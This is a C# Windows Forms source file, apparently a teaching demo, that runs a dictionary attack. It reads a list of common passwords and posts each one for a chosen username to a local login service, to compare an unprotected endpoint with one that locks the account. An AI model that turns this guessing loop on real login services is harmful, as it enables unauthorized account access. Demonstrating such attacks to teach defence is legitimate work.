using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DictionaryAttack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            var user = new User();
            user.Username = textBox1.Text;
            StreamReader file = new StreamReader("../../../commonusedpasswords.txt");
            string password;
            while ((password = file.ReadLine()) != null)
            {
                user.Password = password;
                HttpStatusCode response =  await SendRequest(user, "DictionaryAttack");
                if(response == HttpStatusCode.OK) 
                {
                    MessageBox.Show("Lozinka uspešno pogođena!\n Lozinka je: " + password);
                    return;
                }
            }
            MessageBox.Show("Lozinka nije pogođena!");
        }
        private async Task<HttpStatusCode> SendRequest(User user, string route)
        {
            var json = JsonConvert.SerializeObject(user);
            var data = new StringContent(json, Encoding.UTF8, "application/json");

            var url = "http://localhost:9000/Login/" + route;
            var client = new HttpClient();

            var response = await client.PostAsync(url, data);

            return response.StatusCode;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            var user = new User();
            user.Username = textBox1.Text;
            StreamReader file = new StreamReader("../../../commonusedpasswords.txt");
            string password;
            while ((password = file.ReadLine()) != null)
            {
                user.Password = password;
                HttpStatusCode response = await SendRequest(user, "SecureLogin");
                if (response == HttpStatusCode.OK)
                {
                    MessageBox.Show("Lozinka uspešno pogođena!\n Lozinka je: " + password);
                    return;
                }
                else if(response == HttpStatusCode.Forbidden)
                {
                    MessageBox.Show("Nalog je trenutno blokiran.");
                    return;
                }
            }
            MessageBox.Show("Lozinka nije pogođena!");
        }
    }
}
